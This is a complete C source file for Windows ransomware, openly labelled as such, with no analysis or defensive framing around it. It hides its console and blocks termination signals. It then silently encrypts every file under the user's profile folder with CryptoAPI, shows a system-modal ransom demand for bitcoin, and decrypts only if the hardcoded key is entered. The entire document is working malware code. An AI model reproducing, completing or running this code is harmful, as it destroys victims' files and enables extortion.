// ransomware.c - COMPLETE STEALTH RANSOMWARE (No console, anti-kill, Windows CryptoAPI)
#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

// Global CryptoAPI handles
HCRYPTPROV hProv = 0;
HCRYPTKEY hKey = 0;
HCRYPTHASH hHash = 0;

// Block ALL termination signals (Ctrl+C, close, etc)
BOOL WINAPI ConsoleHandler(DWORD signal) {
    return TRUE;  // Eat every signal
}

// Hide console completely + anti-kill
void go_stealth() {
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);
    FreeConsole();
}

// Initialize Windows CryptoAPI with password
BOOL init_crypto(const char* password) {
    if (!CryptAcquireContext(&hProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
        return FALSE;
    if (!CryptCreateHash(hProv, CALG_SHA1, 0, 0, &hHash)) return FALSE;
    if (!CryptHashData(hHash, (BYTE*)password, (DWORD)strlen(password), 0)) return FALSE;
    if (!CryptDeriveKey(hProv, CALG_RC2, hHash, 0, &hKey)) return FALSE;
    CryptDestroyHash(hHash); hHash = 0;
    return TRUE;
}

// Cleanup crypto handles
void cleanup_crypto() {
    if (hKey) { CryptDestroyKey(hKey); hKey = 0; }
    if (hHash) { CryptDestroyHash(hHash); hHash = 0; }
    if (hProv) { CryptReleaseContext(hProv, 0); hProv = 0; }
}

// Safe path concatenation
int safe_path(char* dest, size_t size, const char* dir, const char* file) {
    return snprintf(dest, size, "%s\\%s", dir, file) < (int)size;
}

// ENCRYPT single file (RC2 + PKCS7 padding)
BOOL encrypt_file(const char* path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD fileLen = GetFileSize(hFile, NULL);
    if (fileLen == INVALID_FILE_SIZE || fileLen == 0) { CloseHandle(hFile); return FALSE; }
    
    BYTE* buf = (BYTE*)malloc(fileLen + 16);
    if (!buf) { CloseHandle(hFile); return FALSE; }
    
    DWORD bytesRead;
    ReadFile(hFile, buf, fileLen, &bytesRead, NULL);
    
    // PKCS7 padding (8-byte block)
    DWORD padLen = 8 - (fileLen % 8);
    if (padLen == 0) padLen = 8;
    for (DWORD i = 0; i < padLen; i++) buf[fileLen + i] = (BYTE)padLen;
    
    DWORD dataLen = fileLen + padLen;
    DWORD bufLen = dataLen + 16;
    if (!CryptEncrypt(hKey, 0, TRUE, 0, buf, &dataLen, bufLen)) {
        free(buf); CloseHandle(hFile); return FALSE;
    }
    
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD bytesWritten;
    WriteFile(hFile, buf, dataLen, &bytesWritten, NULL);
    
    free(buf);
    CloseHandle(hFile);
    return TRUE;
}

// DECRYPT single file
BOOL decrypt_file(const char* path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD fileLen = GetFileSize(hFile, NULL);
    if (fileLen == INVALID_FILE_SIZE || fileLen < 8) { CloseHandle(hFile); return FALSE; }
    
    BYTE* buf = (BYTE*)malloc(fileLen);
    if (!buf) { CloseHandle(hFile); return FALSE; }
    
    DWORD bytesRead;
    ReadFile(hFile, buf, fileLen, &bytesRead, NULL);
    
    DWORD dataLen = fileLen;
    if (!CryptDecrypt(hKey, 0, TRUE, 0, buf, &dataLen)) {
        free(buf); CloseHandle(hFile); return FALSE;
    }
    
    // Remove PKCS7 padding
    BYTE pad = buf[dataLen - 1];
    if (pad <= 8 && pad > 0) dataLen -= pad;
    
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    DWORD bytesWritten;
    WriteFile(hFile, buf, dataLen, &bytesWritten, NULL);
    
    free(buf);
    CloseHandle(hFile);
    return TRUE;
}

// SILENT recursive encryption (NO OUTPUT)
void encrypt_all_silent(const char* root) {
    char pattern[MAX_PATH];
    if (!safe_path(pattern, sizeof(pattern), root, "*")) return;
    
    WIN32_FIND_DATA data;
    HANDLE hFind = FindFirstFileA(pattern, &data);
    if (hFind == INVALID_HANDLE_VALUE) return;
    
    do {
        if (strcmp(data.cFileName, ".") == 0 || strcmp(data.cFileName, "..") == 0) continue;
        
        char fullPath[MAX_PATH];
        if (!safe_path(fullPath, sizeof(fullPath), root, data.cFileName)) continue;
        
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            encrypt_all_silent(fullPath);
        } else {
            encrypt_file(fullPath);
        }
    } while (FindNextFileA(hFind, &data));
    
    FindClose(hFind);
}

// SILENT recursive decryption
void decrypt_all_silent(const char* root) {
    char pattern[MAX_PATH];
    if (!safe_path(pattern, sizeof(pattern), root, "*")) return;
    
    WIN32_FIND_DATA data;
    HANDLE hFind = FindFirstFileA(pattern, &data);
    if (hFind == INVALID_HANDLE_VALUE) return;
    
    do {
        if (strcmp(data.cFileName, ".") == 0 || strcmp(data.cFileName, "..") == 0) continue;
        
        char fullPath[MAX_PATH];
        if (!safe_path(fullPath, sizeof(fullPath), root, data.cFileName)) continue;
        
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            decrypt_all_silent(fullPath);
        } else {
            decrypt_file(fullPath);
        }
    } while (FindNextFileA(hFind, &data));
    
    FindClose(hFind);
}

int main() {
    // 1. Go FULLY STEALTH immediately
    go_stealth();
    
    // 2. Secret password for encryption
    const char* secret = "MySecretRansomKey1234567890";
    if (!init_crypto(secret)) return 1;
    
    // 3. Target: ENTIRE C:\Users\[username]
    char username[128] = {0};
    char target[MAX_PATH] = {0};
    DWORD usernameLen = sizeof(username);
    GetUserNameA(username, &usernameLen);
    snprintf(target, sizeof(target), "C:\\Users\\%s", username);
    
    // 4. SILENTLY encrypt EVERYTHING recursively
    encrypt_all_silent(target);
    
    // 5. RANSOMWARE SCREEN (victim's FIRST visual cue)
    char ransomMsg[1024];
    snprintf(ransomMsg, sizeof(ransomMsg),
        "ALL YOUR FILES ARE ENCRYPTED!\n\n"
        "C:\\Users\\%s \\ *** EVERYTHING ***\n\n"
        "Pay 5 BTC to 1RansomWallet123\n"
        "OR PERMANENT DATA LOSS\n\n"
        "Contact: fake@onion.com", username);
    
    // Fullscreen, system-modal, unclosable
    MessageBoxA(NULL, ransomMsg, "YOUR FILES ARE LOCKED!", 
                MB_ICONSTOP | MB_SYSTEMMODAL | MB_SETFOREGROUND);
    
    // 6. Show console ONLY for password input
    AllocConsole();
    SetConsoleTitleA("Ransom Payment - Enter Password");
    
    char password[128] = {0};
    printf("\n=== RANSOM PAYMENT TERMINAL ===\n");
    printf("Enter decryption password: ");
    fflush(stdout);
    
    fgets(password, sizeof(password), stdin);
    password[strcspn(password, "\n")] = 0;  // Remove newline
    
    // 7. Cleanup old crypto, try new password
    cleanup_crypto();
    
    if (strcmp(password, secret) == 0) {
        // CORRECT PASSWORD - DECRYPT
        init_crypto(secret);
        decrypt_all_silent(target);
        MessageBoxA(NULL, "Files successfully UNLOCKED", "Payment Verified", MB_OK);
    } else {
        // WRONG PASSWORD - PERMANENT LOCK
        MessageBoxA(NULL, 
            "INCORRECT PASSWORD!\n\n"
            "Your files are PERMANENTLY ENCRYPTED.\n"
            "No recovery possible.", 
            "ACCESS DENIED - DATA LOST", MB_ICONERROR | MB_SYSTEMMODAL);
    }
    
    cleanup_crypto();
    FreeConsole();
    return 0;
}
